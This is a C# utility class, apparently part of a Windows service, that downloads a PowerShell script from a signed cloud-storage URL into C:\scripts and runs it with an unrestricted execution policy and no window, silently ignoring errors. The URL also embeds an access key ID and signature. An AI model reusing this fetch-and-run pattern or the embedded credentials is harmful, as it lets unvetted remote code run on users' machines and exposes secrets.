using System.Diagnostics;
using System.Net;

namespace MyService
{
    internal class Util
    {

        static void DownFile(string url, string SaveAsFileName)
        {
            if (!System.IO.Directory.Exists("C:\\scripts"))
            {
                System.IO.Directory.CreateDirectory("C:\\scripts");
            }
            var webClient = new WebClient();
            try
            {
                webClient.DownloadFile(url, SaveAsFileName);
            }
            catch 
            {

                
            }

        }
        static void RunPWSH2(string path)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = @"/c powershell -executionpolicy unrestricted " + path;
            startInfo.UseShellExecute = true;
            startInfo.WindowStyle = ProcessWindowStyle.Normal;
            startInfo.CreateNoWindow = true;
            Process process = new Process();
            process.StartInfo = startInfo;
            process.Start();
        }
        static void RunPWSH()
        {
            string commandStr = "/c powershell -executionpolicy unrestricted C:\\scripts\\installer.PS1";
            System.Diagnostics.Process.Start("cmd.exe", commandStr);
        }
        internal static void DoJob()
        {
            try
            {
                DownFile("https://it2u.oss-cn-shenzhen.aliyuncs.com/scripts/get-info.PS1?OSSAccessKeyId=LTAI5tNKSanBWV3xvbZ2di6u&Expires=1633591444&Signature=H1QjAVa%2BKf6qazIeRcA%2BWP1a9oM%3D", "C:\\scripts\\installer.PS1");

            }
            catch 
            {

            }

            //RunPWSH();
            RunPWSH2("C:\\scripts\\installer.PS1");
        }
    }
}